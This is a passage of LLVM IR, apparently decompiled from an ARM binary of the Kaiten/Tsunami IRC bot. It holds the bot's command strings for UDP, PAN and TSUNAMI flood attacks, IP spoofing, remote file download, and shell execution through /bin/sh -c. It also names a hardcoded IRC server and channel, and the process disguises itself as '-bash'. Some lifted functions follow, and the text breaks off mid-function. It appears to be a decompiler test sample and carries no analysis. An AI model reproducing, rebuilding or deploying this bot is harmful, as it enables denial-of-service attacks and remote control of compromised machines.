source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1f084.5 = global i32 0
@global_var_1f094.6 = global i32* @global_var_1f084.5
@global_var_1f4d0.12 = global i32 0
@global_var_c094.18 = constant i32 -509558771
@global_var_1f4fc.21 = global i32 0
@global_var_21c70.25 = global i32 0
@global_var_14b54.27 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1f4f8.29 = local_unnamed_addr global i32 0
@global_var_21d84.31 = global i32 0
@global_var_1f4f4.35 = global i32 0
@global_var_14b74.37 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_14b84.39 = constant i32 114
@global_var_21c68.41 = global i32 0
@global_var_14b88.43 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_14ba4.45 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_14bc8.47 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_14bf0.49 = constant [8 x i8] c"http://\00"
@global_var_14bf8.51 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_14c20.53 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_14c48.55 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_14d5c.57 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_14d78.59 = constant [3 x i8] c"wb\00"
@global_var_14d7c.61 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_14d84.63 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_14d9c.67 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_14dbc.69 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_14dec.71 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_14e0c.73 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_14e24.75 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_14e5c.77 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_14e68.79 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_14e84.82 = constant [9 x i8] c"Disabled\00"
@global_var_14e90.84 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_14eac.86 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_14ed0.88 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_14ef0.90 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_21b68.92 = global i32 0
@global_var_14f18.94 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_14f38.96 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_14f54.102 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_14f74.105 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_14f90.107 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_14fb0.109 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_14fd0.113 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_1501c.115 = constant [3 x i8] c".0\00"
@global_var_1f8fc.117 = global i32 0
@global_var_15020.120 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_15044.122 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_1506c.124 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_15088.126 = constant i32 2
@global_var_150d8.128 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_15100.130 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_15118.132 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_1513c.134 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_21d78.142 = global i32 0
@global_var_1f4e8.144 = global i32 0
@global_var_21d80.185 = local_unnamed_addr global i32 0
@global_var_21c6c.187 = global i32 0
@global_var_15908.208 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_21d7c.211 = local_unnamed_addr global i32 0
@global_var_15918.213 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_15928.215 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_15930.217 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1593c.222 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_1f09c.232 = local_unnamed_addr global i32 4
@global_var_14b44.234 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_1f0a0.235 = global [16 x i8]* @global_var_14b44.234
@global_var_159bc.238 = constant [6 x i8] c"-bash\00"
@global_var_21c74.242 = local_unnamed_addr global i32 0
@global_var_159c4.245 = constant [7 x i8] c"#Power\00"
@global_var_159cc.248 = constant [7 x i8] c"Powerk\00"
@global_var_159d4.252 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_15a00.256 = constant i32 10
@global_var_1599c.258 = constant [4 x i8] c"352\00"
@global_var_1f128.259 = global [4 x i8]* @global_var_1599c.258
@global_var_15a04.261 = constant [6 x i8] c"ERROR\00"
@global_var_1f16c = external local_unnamed_addr global i32
@global_var_21b40.268 = global i32 0
@global_var_1f1a0.274 = global i32 0
@global_var_1f91c.276 = global i32 0
@global_var_fa5c.278 = constant i32 -481296384
@global_var_cd3c.279 = constant i32 -442564544
@global_var_1f920.281 = global i32 0
@global_var_1f900.283 = global i32 0
@global_var_1f918.288 = global i32 0
@global_var_15d0c.296 = constant [8 x i8] c"/bin/sh\00"
@global_var_15d14.298 = constant [3 x i8] c"sh\00"
@global_var_15d18.300 = constant [3 x i8] c"-c\00"
@global_var_20003.305 = global i32 0
@global_var_20000.306 = global i32 0
@global_var_1f1b8.309 = global i32 2
@global_var_1f188.315 = global i32 0
@global_var_d44c.316 = constant i32 -442564492
@global_var_1f184.318 = global i32* bitcast (i8** @global_var_1f1bc.264 to i32*)
@global_var_15d1c.324 = constant i32 0
@global_var_d60c.329 = constant i32 -382910448
@global_var_11174.330 = constant i32 -382909968
@global_var_11230.331 = constant i32 -382910224
@global_var_15d50.333 = constant i32 135270416
@global_var_15d34.335 = constant [6 x i8] c"(nil)\00"
@global_var_15d3c.338 = constant [7 x i8] c"(null)\00"
@global_var_15d44.340 = constant i32 2949163
@global_var_15dd0.343 = constant i32 16843008
@global_var_15db8.345 = constant i32 327688
@global_var_1f4a0 = external global i32
@global_var_16d7a.350 = constant i32 65536
@global_var_15db0.352 = constant [8 x i8] c" +0-#'I\00"
@global_var_15d58.354 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_15d98.356 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_15d8b.358 = constant i32 117506048
@global_var_15d8c.360 = constant i32 252117248
@global_var_15d7c.362 = constant i32 331776
@global_var_15d6c.364 = constant i32 335616
@global_var_ec9c.396 = constant i32 -456978431
@global_var_15dec.400 = constant [8 x i8] c"Success\00"
@global_var_15ddc.402 = constant [15 x i8] c"Unknown error \00"
@global_var_1f4a8.404 = global i32* @global_var_16d7a.350
@global_var_ec10.405 = constant [3 x i8] c"z\0C\00"
@global_var_21924.407 = global i32 0
@global_var_21af4.411 = global i32 0
@global_var_21928.413 = global i32 0
@global_var_1f4b0.415 = global i32 0
@global_var_21dbc.420 = global i32 0
@global_var_21db0.423 = global i32 0
@global_var_21b08.425 = global i32 0
@global_var_1f3a8.428 = global i32 256
@global_var_1f2ac.429 = global i32* @global_var_1f3a8.428
@global_var_21b30.432 = global i32 0
@global_var_21d88.434 = global i32 0
@global_var_10f2c.435 = constant i32 -382910416
@global_var_fadc.442 = constant i32 -442564520
@global_var_1f3b4.444 = global i32 0
@global_var_10f84.446 = constant i32 -481230848
@global_var_21b20.448 = global i32 0
@global_var_10d38.450 = constant i32 -509587456
@global_var_1f3cc.452 = global i32 0
@global_var_1f3e4 = external global i32
@global_var_1f31d.469 = global i32 0
@global_var_16948.472 = constant i32 0
@global_var_1f480.476 = global i32 0
@global_var_21b24.480 = local_unnamed_addr global i32 0
@global_var_d554.483 = constant i32 -382910416
@global_var_21b2c.485 = global i32 0
@global_var_1f078.488 = global i32 -1
@global_var_21b34.491 = global i32 0
@global_var_21b38.493 = local_unnamed_addr global i32 0
@global_var_10824.494 = constant i32 -390234096
@global_var_16970.496 = constant [10 x i8] c"/dev/null\00"
@global_var_21b3c.498 = global i32 0
@global_var_d4d4.502 = constant i32 -382909968
@global_var_21b28.504 = local_unnamed_addr global i32 0
@global_var_1f498 = external local_unnamed_addr global i32
@global_var_cc08.517 = constant i32 -442564608
@global_var_10aec.519 = constant i32 -335544701
@global_var_10c40.522 = constant i32 -275775369
@global_var_21b64.525 = global i32 0
@global_var_21b44.527 = global i32 0
@global_var_16f7c.529 = constant [4 x i8] c"inf\00"
@global_var_16f7f.533 = constant i32 1179535616
@global_var_16f8c.535 = constant i32 2883630
@global_var_e7a0.537 = constant i32 -382908944
@global_var_21b48.545 = global i32 0
@global_var_21b60.550 = global i32 0
@global_var_ca18.555 = constant i32 -382910448
@global_var_21dc0.558 = global i32 0
@global_var_16fd8.560 = constant i32 46
@global_var_21da0.562 = global i32 0
@global_var_12c84.564 = constant i32 -369098656
@global_var_16fdc.571 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_16ff0.573 = constant i32 114
@global_var_16ff4.575 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1700c.578 = constant [11 x i8] c"nameserver\00"
@global_var_17018.581 = constant [7 x i8] c"domain\00"
@global_var_17020.583 = constant [7 x i8] c"search\00"
@global_var_21dc4.588 = global i32 0
@global_var_21dc8.590 = global i32 0
@global_var_1703c.599 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_17028.601 = constant i32 0
@global_var_17050.604 = constant [3 x i8] c"%x\00"
@global_var_17054.607 = constant [11 x i8] c"/etc/hosts\00"
@global_var_17060.609 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1f07c.615 = global i32 0
@global_var_1f4cc.3 = external global i8*
@global_var_1f4ec.23 = external global i8*
@global_var_1f4f0.33 = external global i8*
@global_var_1f4f3.224 = external local_unnamed_addr global i8*
@global_var_1f4f2.225 = external local_unnamed_addr global i8*
@global_var_1f4f1.226 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_1f1bc.264 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_1f20c.265 = local_unnamed_addr global i8 16
@global_var_10838.270 = constant i8 0
@global_var_1f1bd.321 = local_unnamed_addr global i8 1
@global_var_1f20d.322 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1f4ac.552 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1f4ad.553 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  %v1_80a4 = call i32 @function_14af4(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1f4cc.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1f4cc.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1f094.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1f094.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1f094.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1f094.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1f4cc.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1f094.6, { 1, 0 }
  uselistorder i8** @global_var_1f4cc.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 127112 to i32*), align 8
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 127112

bb2:                                              ; preds = %.thread
  ret i32 127112

; uselistorder directives
  uselistorder i32 127112, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_108d8(i32 ptrtoint (i32* @global_var_c094.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 84784, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_fd08()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81cc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 42
  br i1 %v7_81f4, label %dec_label_pc_8228, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %dec_label_pc_81cc
  %v7_8200 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8200, label %dec_label_pc_8298, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v2_820c = icmp eq i8 %v2_81e8, 0
  br i1 %v2_820c, label %dec_label_pc_8218, label %dec_label_pc_82f0

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208
  %v2_821c = load i8, i8* %tmp, align 1
  %v3_821c = zext i8 %v2_821c to i32
  br label %dec_label_pc_8364

dec_label_pc_8228:                                ; preds = %dec_label_pc_81cc
  %v1_822c = add i32 %tmp8, 1
  %v3_8238 = inttoptr i32 %v1_822c to i8*
  %v4_8238 = call i32 @function_81cc(i8* %v3_8238, i32 %arg2)
  %v2_8240 = icmp eq i32 %v4_8238, 0
  br i1 %v2_8240, label %dec_label_pc_8284, label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %dec_label_pc_8228
  %v2_824c = load i8, i8* %tmp, align 1
  %v2_8250 = icmp eq i8 %v2_824c, 0
  br i1 %v2_8250, label %dec_label_pc_828c, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_8248
  %v1_825c = add i32 %arg2, 1
  %v4_8268 = call i32 @function_81cc(i8* nonnull %arg1, i32 %v1_825c)
  %v2_8270 = icmp eq i32 %v4_8268, 0
  br i1 %v2_8270, label %dec_label_pc_8284, label %dec_label_pc_828c

dec_label_pc_8284:                                ; preds = %dec_label_pc_8258, %dec_label_pc_8228
  br label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8248, %dec_label_pc_8258, %dec_label_pc_8284
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8284 ], [ 1, %dec_label_pc_8258 ], [ 1, %dec_label_pc_8248 ]
  br label %dec_label_pc_8364

dec_label_pc_8298:                                ; preds = %dec_label_pc_81fc
  %v2_829c = load i8, i8* %tmp, align 1
  %v2_82a0 = icmp eq i8 %v2_829c, 0
  br i1 %v2_82a0, label %dec_label_pc_82e4, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %dec_label_pc_8298
  %v1_82ac = add i32 %tmp8, 1
  %v1_82b4 = add i32 %arg2, 1
  %v2_82c0 = inttoptr i32 %v1_82ac to i8*
  %v3_82c0 = call i32 @function_81cc(i8* %v2_82c0, i32 %v1_82b4)
  %v2_82c8 = icmp ne i32 %v3_82c0, 0
  %. = zext i1 %v2_82c8 to i32
  br label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82a8, %dec_label_pc_8298
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8298 ], [ %., %dec_label_pc_82a8 ]
  br label %dec_label_pc_8364

dec_label_pc_82f0:                                ; preds = %dec_label_pc_8208
  %v2_82f4 = load i8, i8* %arg1, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  %v1_82fc = call i32 @function_cbd4(i32 %v3_82f4)
  store i32 %v1_82fc, i32* @r4, align 4
  %v2_8308 = load i8, i8* %tmp, align 1
  %v3_8308 = zext i8 %v2_8308 to i32
  %v1_8310 = call i32 @function_cbd4(i32 %v3_8308)
  %v0_8318 = load i32, i32* @r4, align 4
  %v9_8318 = icmp eq i32 %v0_8318, %v1_8310
  br i1 %v9_8318, label %dec_label_pc_8320, label %dec_label_pc_835c

dec_label_pc_8320:                                ; preds = %dec_label_pc_82f0
  %v1_8324 = add i32 %tmp8, 1
  %v1_832c = add i32 %arg2, 1
  %v2_8338 = inttoptr i32 %v1_8324 to i8*
  %v3_8338 = call i32 @function_81cc(i8* %v2_8338, i32 %v1_832c)
  %v2_8340 = icmp ne i32 %v3_8338, 0
  %.7 = zext i1 %v2_8340 to i32
  br label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_8320, %dec_label_pc_82f0
  %storemerge = phi i32 [ 1, %dec_label_pc_82f0 ], [ %.7, %dec_label_pc_8320 ]
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_828c, %dec_label_pc_8218, %dec_label_pc_835c
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_828c ], [ %storemerge2, %dec_label_pc_82e4 ], [ %v3_821c, %dec_label_pc_8218 ], [ %storemerge, %dec_label_pc_835c ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_cbd4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8364, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_828c, { 2, 1, 0 }
}

define i32 @function_8374(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8374:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8374 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8374, i32* @ip, align 4
  %v6_8378 = load i32, i32* @r2, align 4
  store i32 %v6_8378, i32* %stack_var_-8, align 4
  %v3_837c = load i32, i32* @fp, align 4
  store i32 33668, i32* %stack_var_-16, align 4
  %v2_8380 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8380, i32* @fp, align 4
  %v4_8390 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_1f4fc.21 to i32), i32* @r0, align 4
  %v3_83a4 = call i32 @function_cda0(i32 ptrtoint (i32* @global_var_1f4fc.21 to i32), i32 %arg2, i32 %v4_8390)
  store i32 ptrtoint (i32* @global_var_1f4fc.21 to i32), i32* @r0, align 4
  %v0_83ac = call i32 @function_ecc0()
  store i32 %v0_83ac, i32* @r2, align 4
  %v3_83c0 = call i32 @function_cba8(i32 %arg1, i32* nonnull @global_var_1f4fc.21)
  store i32 %v3_837c, i32* @fp, align 4
  ret i32 %v3_83c0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f4fc.21 to i32), { 1, 0, 2 }
}

define i32 @function_83d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_83d8:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  %v3_83dc = load i32, i32* @fp, align 4
  store i32 33764, i32* %stack_var_-4, align 4
  %v2_83e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_83e0, i32* @fp, align 4
  %v2_83f0 = load i8, i8* bitcast (i8** @global_var_1f4ec.23 to i8*), align 4
  %v7_83f4 = icmp eq i8 %v2_83f0, 1
  br i1 %v7_83f4, label %dec_label_pc_83fc, label %dec_label_pc_8420

dec_label_pc_83fc:                                ; preds = %dec_label_pc_83d8
  %v2_8400 = load i32, i32* @global_var_21c70.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8410 = call i32 @function_8374(i32 %v2_8400, i32 ptrtoint ([30 x i8]* @global_var_14b54.27 to i32))
  br label %dec_label_pc_8524

dec_label_pc_8420:                                ; preds = %dec_label_pc_83d8
  %v1_8420 = call i32 @function_ca44(i32 %arg1)
  %v2_8430 = icmp eq i32 %v1_8420, 0
  br i1 %v2_8430, label %dec_label_pc_8438, label %dec_label_pc_8444

dec_label_pc_8438:                                ; preds = %dec_label_pc_8420
  br label %dec_label_pc_8524

dec_label_pc_8444:                                ; preds = %dec_label_pc_8420
  %v2_8448 = load i32, i32* @global_var_1f4f8.29, align 4
  %v1_844c = add i32 %v2_8448, 1
  store i32 %v1_844c, i32* @global_var_1f4f8.29, align 4
  %v3_8460 = mul i32 %v1_844c, 4
  %v1_8464 = add i32 %v3_8460, 4
  %v1_846c = call i32 @function_f908(i32 %v1_8464)
  %v2_84c812 = load i32, i32* @global_var_1f4f8.29, align 4
  %v9_84d414 = icmp eq i32 %v2_84c812, 1
  br i1 %v9_84d414, label %dec_label_pc_84dc, label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %dec_label_pc_8444, %dec_label_pc_8484
  %storemerge116 = phi i32 [ %v1_84bc, %dec_label_pc_8484 ], [ 0, %dec_label_pc_8444 ]
  %v3_8488 = mul i32 %storemerge116, 4
  %v2_8494 = add i32 %v3_8488, %v1_846c
  %v2_84a8 = load i32, i32* @global_var_21d84.31, align 4
  %v2_84ac = add i32 %v2_84a8, %v3_8488
  %v1_84b0 = inttoptr i32 %v2_84ac to i32*
  %v2_84b0 = load i32, i32* %v1_84b0, align 4
  %v2_84b4 = inttoptr i32 %v2_8494 to i32*
  store i32 %v2_84b0, i32* %v2_84b4, align 4
  %v1_84bc = add i32 %storemerge116, 1
  %v2_84c8 = load i32, i32* @global_var_1f4f8.29, align 4
  %v1_84cc = add i32 %v2_84c8, -1
  %tmp = icmp ugt i32 %v1_84cc, %v1_84bc
  br i1 %tmp, label %dec_label_pc_8484, label %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge

dec_label_pc_84c4.dec_label_pc_84dc_crit_edge:    ; preds = %dec_label_pc_8484
  br label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8444, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge
  %v2_84c8.lcssa = phi i32 [ %v2_84c8, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge ], [ %v2_84c812, %dec_label_pc_8444 ]
  %v3_84e4 = mul i32 %v2_84c8.lcssa, 4
  %v2_84f0 = add i32 %v1_846c, -4
  %v1_84f4 = add i32 %v2_84f0, %v3_84e4
  %v2_84fc = inttoptr i32 %v1_84f4 to i32*
  store i32 %v1_8420, i32* %v2_84fc, align 4
  %v2_8504 = load i32, i32* @global_var_21d84.31, align 4
  %v1_850c = call i32 @function_fa5c(i32 %v2_8504)
  store i32 %v1_846c, i32* @global_var_21d84.31, align 4
  br label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8438, %dec_label_pc_83fc, %dec_label_pc_84dc
  %v3_8524 = phi i32 [ 0, %dec_label_pc_8438 ], [ 1, %dec_label_pc_83fc ], [ %v1_8420, %dec_label_pc_84dc ]
  store i32 %v3_83dc, i32* @fp, align 4
  ret i32 %v3_8524

; uselistorder directives
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84c812, { 1, 0 }
  uselistorder i32 %v1_846c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8524, { 2, 0, 1 }
  uselistorder label %dec_label_pc_84dc, { 1, 0 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
}

define i32 @function_8548() local_unnamed_addr {
dec_label_pc_8548:
  %v2_855c = load i8*, i8** @global_var_1f4f0.33, align 4
